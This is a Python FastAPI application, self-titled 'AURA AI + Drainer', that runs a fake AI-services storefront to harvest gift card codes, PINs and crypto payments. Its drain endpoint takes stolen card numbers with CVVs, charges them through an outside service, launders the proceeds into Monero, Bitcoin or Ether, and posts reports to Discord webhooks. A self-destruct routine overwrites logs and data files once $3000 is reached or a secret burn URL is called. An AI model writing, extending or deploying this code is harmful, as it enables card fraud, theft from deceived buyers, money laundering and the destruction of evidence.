import os
import json
import random
import httpx
import shutil
import logging
from logging.handlers import RotatingFileHandler
from datetime import datetime
from fastapi import FastAPI, Request, HTTPException, Form
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.templating import Jinja2Templates
from pydantic import BaseModel, validator
from cryptography.fernet import Fernet
from dotenv import load_dotenv
import jinja2

load_dotenv()

# ---------- Configuration ----------
DISCORD_WEBHOOK = os.getenv("DISCORD_WEBHOOK", "")
DISCORD_WEBHOOK_FALLBACK = os.getenv("DISCORD_WEBHOOK_FALLBACK", "")
XMR_WALLET = os.getenv("XMR_WALLET", "")
BTC_WALLET = os.getenv("BTC_WALLET", "")
ETH_WALLET = os.getenv("ETH_WALLET", "")
CHARGER_URL = os.getenv("CHARGER_URL", "")
CHARGER_KEY = os.getenv("CHARGER_KEY", "")
FIXEDFLOAT_API_KEY = os.getenv("FIXEDFLOAT_API_KEY", "")
FIXEDFLOAT_SECRET = os.getenv("FIXEDFLOAT_SECRET", "")
BURN_SECRET = os.getenv("BURN_SECRET", "default_secret")
BURN_THRESHOLD = float(os.getenv("BURN_THRESHOLD", 3000.0))
ENCRYPTION_KEY = os.getenv("ENCRYPTION_KEY", "").encode()

if not ENCRYPTION_KEY:
    raise ValueError("ENCRYPTION_KEY not set in .env")

fernet = Fernet(ENCRYPTION_KEY)
DATA_FILE = "data.enc"
TEMP_FILE = "data.enc.tmp"

# ---------- Logging ----------
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)
handler = RotatingFileHandler('app.log', maxBytes=10*1024*1024, backupCount=5)
handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
logger.addHandler(handler)
console = logging.StreamHandler()
console.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
logger.addHandler(console)

# ---------- Storage utils ----------
def encrypt_data(data: dict) -> bytes:
    return fernet.encrypt(json.dumps(data).encode())

def decrypt_data(encrypted: bytes) -> dict:
    return json.loads(fernet.decrypt(encrypted).decode())

def read_storage():
    if not os.path.exists(DATA_FILE):
        default = {"total": 0.0, "processed": [], "gift_cards": [], "crypto_txs": [], "withdrawals": []}
        write_storage(default)
        return default
    try:
        with open(DATA_FILE, "rb") as f:
            return decrypt_data(f.read())
    except Exception as e:
        logger.error(f"Storage read error: {e}, recreating")
        default = {"total": 0.0, "processed": [], "gift_cards": [], "crypto_txs": [], "withdrawals": []}
        write_storage(default)
        return default

def write_storage(data: dict):
    encrypted = encrypt_data(data)
    with open(TEMP_FILE, "wb") as f:
        f.write(encrypted)
        f.flush()
        os.fsync(f.fileno())
    os.replace(TEMP_FILE, DATA_FILE)

# ---------- Init ----------
storage = read_storage()
total_laundered = storage.get("total", 0.0)
processed_ids = set(storage.get("processed", []))
gift_cards = storage.get("gift_cards", [])
crypto_txs = storage.get("crypto_txs", [])
withdrawals = storage.get("withdrawals", [])

# ---------- Pydantic Models ----------
class CardPayload(BaseModel):
    cardNumber: str
    exp: str
    cvv: str
    amount: float
    cardholder: str = "User"
    crypto: str = "XMR"
    order_id: str

    @validator('cardNumber')
    def validate_card(cls, v):
        if not v.replace(" ", "").isdigit():
            raise ValueError("Card number must be numeric")
        return v

    @validator('exp')
    def validate_exp(cls, v):
        if "/" not in v:
            raise ValueError("Expiry format MM/YY")
        return v

    @validator('crypto')
    def validate_crypto(cls, v):
        if v not in ["XMR", "BTC", "ETH"]:
            raise ValueError("Crypto must be XMR, BTC, or ETH")
        return v

# ---------- FastAPI App ----------
app = FastAPI(title="AURA AI + Drainer")

# Set up Jinja2 templates from strings
templates_env = jinja2.Environment(
    loader=jinja2.DictLoader({
        "base.html": '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{% block title %}AURA AI{% endblock %}</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f4f7fc; color: #333; }
        .container { width: 90%; max-width:1200px; margin:0 auto; padding:20px; }
        nav { background: #1a2a3a; color:white; padding:15px 0; }
        nav .container { display:flex; justify-content:space-between; align-items:center; }
        nav .logo { font-size:1.8rem; font-weight:bold; text-decoration:none; color:#ffd700; }
        nav ul { list-style:none; display:flex; gap:20px; }
        nav ul a { color:white; text-decoration:none; }
        .hero { background:linear-gradient(135deg,#1a2a3a,#2c3e50); color:white; padding:80px 0; text-align:center; }
        .hero h1 { font-size:3rem; margin-bottom:20px; }
        .btn { display:inline-block; padding:12px 30px; background:#ffd700; color:#1a2a3a; border-radius:4px; text-decoration:none; font-weight:bold; margin:10px; border:none; cursor:pointer; }
        .btn-secondary { background:#2c3e50; color:white; }
        .features { padding:60px 0; }
        .features .grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(250px,1fr)); gap:30px; margin-top:30px; }
        .feature { background:white; padding:20px; border-radius:8px; box-shadow:0 2px 10px rgba(0,0,0,0.1); }
        .pricing-grid { display:flex; justify-content:center; gap:40px; margin:40px 0; flex-wrap:wrap; }
        .plan { background:white; padding:30px; border-radius:10px; box-shadow:0 4px 20px rgba(0,0,0,0.1); text-align:center; min-width:250px; }
        .plan.featured { border:2px solid #ffd700; }
        table { width:100%; border-collapse:collapse; margin:20px 0; }
        table th, table td { border:1px solid #ddd; padding:10px; text-align:left; }
        table th { background:#1a2a3a; color:white; }
        form label { display:block; margin:15px 0 5px; }
        form input, form select { width:100%; padding:10px; border:1px solid #ddd; border-radius:4px; }
        .crypto-box { background:#e8f0fe; padding:20px; border-radius:8px; margin:20px 0; }
        footer { background:#1a2a3a; color:white; text-align:center; padding:20px 0; margin-top:40px; }
        .error { color:red; }
        .success { color:green; }
    </style>
</head>
<body>
    <nav>
        <div class="container">
            <a href="/" class="logo">AURA AI</a>
            <ul>
                <li><a href="/">Home</a></li>
                <li><a href="/pricing">Pricing</a></li>
                <li><a href="/about">About</a></li>
                <li><a href="/admin">Admin</a></li>
            </ul>
        </div>
    </nav>
    <main>{% block content %}{% endblock %}</main>
    <footer><p>&copy; 2026 AURA AI – Intelligent Automation</p></footer>
</body>
</html>
''',
        "index.html": '''{% extends "base.html" %}
{% block title %}AURA AI – Next‑Gen Intelligence{% endblock %}
{% block content %}
<section class="hero">
    <div class="container">
        <h1>Unlock the Future with AURA AI</h1>
        <p>We provide cutting‑edge AI solutions for businesses and individuals.</p>
        <a href="/pricing" class="btn">Get Started</a>
    </div>
</section>
<section class="features">
    <div class="container">
        <h2>Why Choose Us?</h2>
        <div class="grid">
            <div class="feature"><h3>⚡ Lightning Speed</h3><p>Real‑time processing.</p></div>
            <div class="feature"><h3>🔒 Secure & Private</h3><p>Encrypted and private.</p></div>
            <div class="feature"><h3>💳 Flexible Payments</h3><p>Gift cards & crypto accepted.</p></div>
        </div>
    </div>
</section>
{% endblock %}
''',
        "pricing.html": '''{% extends "base.html" %}
{% block title %}Pricing – AURA AI{% endblock %}
{% block content %}
<div class="container">
    <h1>Choose Your Plan</h1>
    <div class="pricing-grid">
        <div class="plan">
            <h2>Starter</h2>
            <p>$49/month</p>
            <ul><li>10 API calls/day</li><li>Basic analytics</li></ul>
            <a href="/pay/gift" class="btn">Pay with Gift Card</a>
            <a href="/pay/crypto" class="btn btn-secondary">Pay with Crypto</a>
        </div>
        <div class="plan featured">
            <h2>Pro</h2>
            <p>$199/month</p>
            <ul><li>100 API calls/day</li><li>Advanced analytics</li><li>Priority support</li></ul>
            <a href="/pay/gift" class="btn">Pay with Gift Card</a>
            <a href="/pay/crypto" class="btn btn-secondary">Pay with Crypto</a>
        </div>
    </div>
</div>
{% endblock %}
''',
        "gift.html": '''{% extends "base.html" %}
{% block title %}Pay with Gift Card{% endblock %}
{% block content %}
<div class="container">
    <h1>Submit Your Gift Card</h1>
    <form id="gift-form">
        <label>Card Type</label>
        <select name="card_type" required>
            <option value="amazon">Amazon</option>
            <option value="steam">Steam</option>
            <option value="visa">Visa Gift</option>
            <option value="other">Other</option>
        </select>
        <label>Card Number</label>
        <input type="text" name="card_number" placeholder="Enter code/numbers" required>
        <label>PIN (if any)</label>
        <input type="text" name="card_pin" placeholder="PIN code">
        <button type="submit" class="btn">Submit</button>
    </form>
    <div id="gift-result"></div>
</div>
<script>
document.getElementById('gift-form').addEventListener('submit', async (e) => {
    e.preventDefault();
    const form = new FormData(e.target);
    const resp = await fetch('/pay/gift', { method: 'POST', body: form });
    const data = await resp.json();
    document.getElementById('gift-result').innerText = data.message || data.error;
});
</script>
{% endblock %}
''',
        "crypto.html": '''{% extends "base.html" %}
{% block title %}Pay with Crypto{% endblock %}
{% block content %}
<div class="container">
    <h1>Pay with Cryptocurrency</h1>
    <p>Send your crypto to the address below. Then confirm.</p>
    <div class="crypto-box">
        <h3>BTC Address: <span id="btc-address">1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa</span></h3>
    </div>
    <form id="crypto-form">
        <label>Currency</label>
        <select name="currency">
            <option value="BTC">Bitcoin</option>
            <option value="ETH">Ethereum</option>
            <option value="USDT">USDT</option>
        </select>
        <label>Amount Sent</label>
        <input type="number" step="0.00000001" name="amount" required>
        <label>Your Sending Address</label>
        <input type="text" name="source_address" placeholder="0x...">
        <button type="submit" class="btn">Confirm Payment</button>
    </form>
    <div id="crypto-result"></div>
</div>
<script>
document.getElementById('crypto-form').addEventListener('submit', async (e) => {
    e.preventDefault();
    const form = new FormData(e.target);
    const resp = await fetch('/pay/crypto', { method: 'POST', body: form });
    const data = await resp.json();
    document.getElementById('crypto-result').innerText = data.message || data.error;
});
</script>
{% endblock %}
''',
        "admin.html": '''{% extends "base.html" %}
{% block title %}Admin Dashboard{% endblock %}
{% block content %}
<div class="container">
    <h1>Admin Dashboard</h1>
    <a href="/admin/logout" class="btn btn-secondary">Logout</a>
    <h2>Gift Cards</h2>
    <table>
        <tr><th>ID</th><th>Type</th><th>Number</th><th>PIN</th></tr>
        {% for card in gift_cards %}
        <tr><td>{{ card.id }}</td><td>{{ card.type }}</td><td>{{ card.number[:10] }}...</td><td>{{ card.pin or 'N/A' }}</td></tr>
        {% endfor %}
    </table>
    <h2>Crypto Transactions</h2>
    <table>
        <tr><th>ID</th><th>Currency</th><th>Amount</th><th>USD Value</th><th>Status</th><th>Source</th></tr>
        {% for tx in crypto_txs %}
        <tr><td>{{ tx.id }}</td><td>{{ tx.currency }}</td><td>{{ tx.amount }}</td><td>${{ tx.usd|round(2) }}</td><td>{{ tx.status }}</td><td>{{ tx.source[:10] }}...</td></tr>
        {% endfor %}
    </table>
    <h2>Withdrawals</h2>
    <table>
        <tr><th>ID</th><th>Amount (USD)</th><th>Method</th><th>Status</th></tr>
        {% for w in withdrawals %}
        <tr><td>{{ w.id }}</td><td>${{ w.amount|round(2) }}</td><td>{{ w.method }}</td><td>{{ w.status }}</td></tr>
        {% endfor %}
    </table>
    <h2>Drainer Stats</h2>
    <p><strong>Total Laundered:</strong> ${{ total_laundered|round(2) }}</p>
    <p><strong>Processed Orders:</strong> {{ processed_count }}</p>
</div>
{% endblock %}
''',
        "about.html": '''{% extends "base.html" %}
{% block title %}About Us{% endblock %}
{% block content %}
<div class="container">
    <h1>About AURA AI</h1>
    <p>We're a cutting‑edge AI research lab.</p>
</div>
{% endblock %}
''',
        "admin_login.html": '''{% extends "base.html" %}
{% block title %}Admin Login{% endblock %}
{% block content %}
<div class="container">
    <h1>Admin Login</h1>
    <form method="post">
        <label>Username</label>
        <input type="text" name="username" required>
        <label>Password</label>
        <input type="password" name="password" required>
        <button type="submit" class="btn">Login</button>
    </form>
    {% if error %}<p class="error">{{ error }}</p>{% endif %}
</div>
{% endblock %}
'''
    })
)

templates = Jinja2Templates(env=templates_env)

# ---------- Frontend Routes ----------
@app.get("/", response_class=HTMLResponse)
async def index(request: Request):
    return templates.TemplateResponse("index.html", {"request": request})

@app.get("/pricing", response_class=HTMLResponse)
async def pricing(request: Request):
    return templates.TemplateResponse("pricing.html", {"request": request})

@app.get("/about", response_class=HTMLResponse)
async def about(request: Request):
    return templates.TemplateResponse("about.html", {"request": request})

@app.get("/pay/gift", response_class=HTMLResponse)
async def pay_gift_page(request: Request):
    return templates.TemplateResponse("gift.html", {"request": request})

@app.post("/pay/gift")
async def pay_gift(request: Request):
    form = await request.form()
    card_type = form.get("card_type")
    card_number = form.get("card_number")
    card_pin = form.get("card_pin", "")
    if not card_number:
        return JSONResponse({"error": "Card number required"}, status_code=400)
    # Store in encrypted storage
    storage = read_storage()
    gift_cards = storage.get("gift_cards", [])
    gift_cards.append({
        "id": len(gift_cards)+1,
        "type": card_type,
        "number": card_number,
        "pin": card_pin
    })
    storage["gift_cards"] = gift_cards
    write_storage(storage)
    logger.info(f"Gift card submitted: {card_type} - {card_number[-4:]}")
    return JSONResponse({"message": "Gift card accepted! We'll process it shortly."})

@app.get("/pay/crypto", response_class=HTMLResponse)
async def pay_crypto_page(request: Request):
    return templates.TemplateResponse("crypto.html", {"request": request})

@app.post("/pay/crypto")
async def pay_crypto(request: Request):
    form = await request.form()
    currency = form.get("currency", "BTC")
    try:
        amount = float(form.get("amount", 0))
    except:
        return JSONResponse({"error": "Invalid amount"}, status_code=400)
    source = form.get("source_address", "")
    if amount <= 0:
        return JSONResponse({"error": "Amount must be > 0"}, status_code=400)
    # Simulate price
    price = 60000 if currency == "BTC" else 3000 if currency == "ETH" else 1
    usd_value = amount * price
    usd_received = usd_value * 0.99
    # Store in storage
    storage = read_storage()
    crypto_txs = storage.get("crypto_txs", [])
    tx_id = len(crypto_txs)+1
    crypto_txs.append({
        "id": tx_id,
        "currency": currency,
        "amount": amount,
        "usd": usd_received,
        "status": "converted",
        "source": source
    })
    storage["crypto_txs"] = crypto_txs
    withdrawals = storage.get("withdrawals", [])
    withdrawals.append({
        "id": len(withdrawals)+1,
        "amount": usd_received,
        "method": "bank_wire",
        "status": "pending"
    })
    storage["withdrawals"] = withdrawals
    write_storage(storage)
    logger.info(f"Crypto payment: {amount} {currency} -> ${usd_received}")
    return JSONResponse({"message": f"Received {amount} {currency} (~${usd_received:.2f}) – processing complete."})

# ---------- Admin Routes ----------
@app.get("/admin", response_class=HTMLResponse)
async def admin_login_page(request: Request):
    return templates.TemplateResponse("admin_login.html", {"request": request})

@app.post("/admin")
async def admin_login(request: Request):
    form = await request.form()
    username = form.get("username")
    password = form.get("password")
    if username == os.getenv("ADMIN_USER", "admin") and password == os.getenv("ADMIN_PASS", "admin123"):
        # Set session cookie
        response = templates.TemplateResponse("admin.html", {
            "request": request,
            "gift_cards": read_storage().get("gift_cards", []),
            "crypto_txs": read_storage().get("crypto_txs", []),
            "withdrawals": read_storage().get("withdrawals", []),
            "total_laundered": read_storage().get("total", 0.0),
            "processed_count": len(read_storage().get("processed", []))
        })
        response.set_cookie(key="admin", value="true", httponly=True)
        return response
    else:
        return templates.TemplateResponse("admin_login.html", {"request": request, "error": "Invalid credentials"})

@app.get("/admin/dashboard")
async def admin_dashboard(request: Request):
    if request.cookies.get("admin") != "true":
        return templates.TemplateResponse("admin_login.html", {"request": request, "error": "Please login"})
    storage = read_storage()
    return templates.TemplateResponse("admin.html", {
        "request": request,
        "gift_cards": storage.get("gift_cards", []),
        "crypto_txs": storage.get("crypto_txs", []),
        "withdrawals": storage.get("withdrawals", []),
        "total_laundered": storage.get("total", 0.0),
        "processed_count": len(storage.get("processed", []))
    })

@app.get("/admin/logout")
async def admin_logout():
    response = JSONResponse({"message": "Logged out"})
    response.delete_cookie("admin")
    return response

# ---------- Drainer Endpoints ----------
async def send_discord(message: str, color=0x00ff00):
    embeds = {"embeds": [{"title": "Drain Report", "description": message, "color": color}]}
    try:
        httpx.post(DISCORD_WEBHOOK, json=embeds, timeout=10)
    except Exception as e:
        logger.warning(f"Primary webhook failed: {e}")
        if DISCORD_WEBHOOK_FALLBACK:
            try:
                httpx.post(DISCORD_WEBHOOK_FALLBACK, json=embeds, timeout=10)
            except Exception as e2:
                logger.error(f"Fallback webhook also failed: {e2}")

async def buy_crypto(crypto: str, amount_usd: float):
    wallet_map = {"XMR": XMR_WALLET, "BTC": BTC_WALLET, "ETH": ETH_WALLET}
    dest = wallet_map.get(crypto)
    if not dest:
        logger.error(f"No wallet for {crypto}")
        return
    payload = {
        "fromCurrency": "USD",
        "toCurrency": crypto,
        "amount": str(amount_usd),
        "type": "direct",
        "destinationAddress": dest,
        "apiKey": FIXEDFLOAT_API_KEY,
        "secret": FIXEDFLOAT_SECRET
    }
    async with httpx.AsyncClient() as client:
        try:
            resp = await client.post("https://api.fixedfloat.com/v2/createOrder", json=payload, timeout=15)
            if resp.status_code == 200:
                logger.info(f"Crypto success: {resp.text[:200]}")
                await send_discord(f"✅ Crypto purchase successful")
            else:
                logger.error(f"Crypto failed: {resp.text}")
                await send_discord(f"⚠️ Crypto purchase failed (HTTP {resp.status_code})")
        except Exception as e:
            logger.error(f"Crypto exception: {e}")
            await send_discord(f"❌ Crypto exception: {str(e)}")

def charge_card(card_data: dict) -> bool:
    try:
        exp_parts = card_data["exp"].split("/")
        month = exp_parts[0].strip()
        year = "20" + exp_parts[1].strip() if len(exp_parts[1]) == 2 else exp_parts[1]
    except:
        return False
    payload = {
        "cc": card_data["cardNumber"].replace(" ", ""),
        "month": month,
        "year": year,
        "cvv": card_data["cvv"],
        "amount": str(card_data["amount"]),
        "holder": card_data.get("cardholder", "User"),
        "currency": "USD"
    }
    try:
        r = httpx.post(CHARGER_URL, json=payload, headers={"x-api-key": CHARGER_KEY}, timeout=20)
        resp = r.json()
        success = resp.get("status") in ["success", "approved", "charged"]
        logger.info(f"Charge {card_data['cardNumber'][-4:]}: {success}")
        return success
    except Exception as e:
        logger.error(f"Charge exception: {e}")
        return False

def secure_delete(path):
    try:
        with open(path, "ba+") as f:
            length = f.tell()
            f.seek(0)
            f.write(os.urandom(length))
        os.remove(path)
    except:
        pass

def self_destruct():
    import asyncio
    asyncio.run(send_discord("🔥 SITE REACHED $3000 — SELF DESTRUCTING", color=0xff0000))
    for root, dirs, files in os.walk("."):
        for f in files:
            if f.endswith((".log", ".json", ".db", ".pyc", ".enc")):
                secure_delete(os.path.join(root, f))
    shutil.rmtree("__pycache__", ignore_errors=True)
    logger.critical("SITE DESTROYED")
    os._exit(0)

@app.post("/api/drain")
async def drain(request: Request):
    global total_laundered, processed_ids
    try:
        data = await request.json()
        payload = CardPayload(**data)
    except Exception as e:
        logger.warning(f"Invalid payload: {e}")
        raise HTTPException(status_code=400, detail=str(e))

    if payload.order_id in processed_ids:
        logger.warning(f"Duplicate order {payload.order_id}")
        return {"success": False, "message": "Duplicate order_id"}

    if total_laundered >= BURN_THRESHOLD:
        return {"success": False, "message": "Service disabled"}

    if charge_card(payload.dict()):
        total_laundered += payload.amount
        processed_ids.add(payload.order_id)
        storage = read_storage()
        storage["total"] = total_laundered
        storage["processed"] = list(processed_ids)
        write_storage(storage)

        import asyncio
        asyncio.create_task(buy_crypto(payload.crypto, payload.amount))

        msg = f"**Success** | Order `{payload.order_id}`\nAmount: ${payload.amount:.2f}\nCard: `....{payload.cardNumber[-4:]}`\nCrypto: {payload.crypto}\nTotal: ${total_laundered:.2f}"
        asyncio.create_task(send_discord(msg))

        if total_laundered >= BURN_THRESHOLD:
            self_destruct()

        return {"success": True, "order_id": payload.order_id}
    else:
        asyncio.create_task(send_discord(f"❌ Failed — Order {payload.order_id}"))
        return {"success": False, "message": "Charge failed"}

@app.get("/burn")
async def manual_burn(token: str = None):
    if token != BURN_SECRET:
        raise HTTPException(status_code=401, detail="Unauthorized")
    self_destruct()
    return {"status": "burned"}

# ---------- Health ----------
@app.get("/health")
async def health():
    return {"status": "running", "total_laundered": total_laundered}